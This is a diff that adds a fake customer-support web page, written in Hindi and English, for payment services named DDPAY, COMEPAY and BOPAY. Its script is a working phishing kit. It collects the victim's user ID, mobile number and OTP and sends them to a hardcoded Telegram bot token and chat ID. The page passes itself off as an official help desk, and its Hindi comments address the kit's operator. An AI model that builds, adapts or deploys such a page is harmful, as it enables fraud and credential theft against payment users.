@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>कस्टमर सपोर्ट</title>
+    <style>
+        /* --- आपका CSS यहाँ रहेगा (मैंने छोटा कर दिया है) --- */
+        body { font-family: Arial, sans-serif; background: #f4f4f4; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.1); width: 90%; max-width: 400px; text-align: center; }
+        .payment-btn { display: block; width: 100%; padding: 12px; margin: 10px 0; border: none; border-radius: 5px; background: #007bff; color: white; font-size: 16px; cursor: pointer; }
+        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
+        button[type="submit"] { width: 100%; padding: 12px; background: #28a745; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; }
+        .otp-section { margin-top: 20px; border-top: 1px solid #eee; padding-top: 20px; }
+        .error { color: red; display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>CUSTOMER SUPPORT</h2>
+        <p>24/7 OFFICIAL HELP & DESK CENTER</p>
+        
+        <h3>SELECT YOUR PAYMENT PARTNER</h3>
+        <button class="payment-btn" onclick="selectPartner('DDPAY')">DDPAY ➔</button>
+        <button class="payment-btn" onclick="selectPartner('COMEPAY')">COMEPAY ➔</button>
+        <button class="payment-btn" onclick="selectPartner('BOPAY')">BOPAY ➔</button>
+
+        <div id="userForm">
+            <h3>ENTER YOUR DETAILS BELOW TO PROCEED</h3>
+            <input type="text" id="userId" placeholder="USER ID NUMBER">
+            <input type="text" id="mobile" placeholder="MOBILE NUMBER">
+            <button type="submit" onclick="submitDetails()">SUBMIT DETAILS</button>
+        </div>
+
+        <div class="otp-section">
+            <h3>ENTER ONE TIME PASSWORD (OTP)</h3>
+            <input type="text" id="otp" placeholder="ENTER OTP">
+            <button onclick="verifyOTP()">VERIFY OTP</button>
+            <p id="errorMsg" class="error">⚠️ INCORRECT OTP. PLEASE TRY AGAIN.</p>
+        </div>
+    </div>
+
+    <script>
+        // --- Telegram Bot Configuration ---
+        const BOT_TOKEN = '8929940502:AAG07IJ8WmqjMCpiu59DgMEOoDdV9fZvjd0'; // आपका टोकन
+        const CHAT_ID = '8952829499'; // आपका चैट ID
+
+        // --- Function to send data to Telegram ---
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                const data = await response.json();
+                if (!data.ok) {
+                    console.error('Telegram Error:', data.description);
+                    alert('डेटा भेजने में त्रुटि हुई। कृपया बाद में प्रयास करें।');
+                } else {
+                    alert('आपका डेटा सफलतापूर्वक भेज दिया गया है!');
+                }
+            } catch (error) {
+                console.error('Network Error:', error);
+                alert('नेटवर्क त्रुटि। कृपया इंटरनेट कनेक्शन जाँचें।');
+            }
+        }
+
+        // --- Variables to store user data ---
+        let userData = { partner: '', userId: '', mobile: '' };
+
+        // --- Select Payment Partner ---
+        function selectPartner(partner) {
+            userData.partner = partner;
+            document.querySelectorAll('.payment-btn').forEach(btn => btn.style.background = '#007bff');
+            event.target.style.background = '#0056b3';
+            alert(`आपने ${partner} चुना है।`);
+        }
+
+        // --- Submit Details ---
+        function submitDetails() {
+            const userId = document.getElementById('userId').value.trim();
+            const mobile = document.getElementById('mobile').value.trim();
+
+            if (!userData.partner) {
+                alert('कृपया पहले अपना पेमेंट पार्टनर चुनें।');
+                return;
+            }
+            if (!userId || !mobile) {
+                alert('कृपया USER ID और MOBILE NUMBER दोनों भरें।');
+                return;
+            }
+
+            userData.userId = userId;
+            userData.mobile = mobile;
+
+            // Format message for Telegram
+            const message = `🔹 <b>नया सपोर्ट रिक्वेस्ट</b> 🔹\n\n` +
+                            `🤝 पार्टनर: ${userData.partner}\n` +
+                            `🆔 यूजर आईडी: ${userData.userId}\n` +
+                            `📱 मोबाइल: ${userData.mobile}\n` +
+                            `⏱️ समय: ${new Date().toLocaleString('hi-IN')}`;
+
+            sendToTelegram(message);
+        }
+
+        // --- Verify OTP (Demo) ---
+        function verifyOTP() {
+            const otp = document.getElementById('otp').value.trim();
+            const errorMsg = document.getElementById('errorMsg');
+
+            if (otp === '1234') { // Demo OTP - आप इसे बदल सकते हैं
+                errorMsg.style.display = 'none';
+                alert('✅ OTP सही है! (यह डेमो है)');
+                // यहाँ आप सफलता का मैसेज Telegram पर भेज सकते हैं
+                sendToTelegram(`✅ OTP सफलतापूर्वक वेरिफाई हुआ for ${userData.userId}`);
+            } else {
+                errorMsg.style.display = 'block';
+            }
+        }
+    </script>
+</body>
+</html>
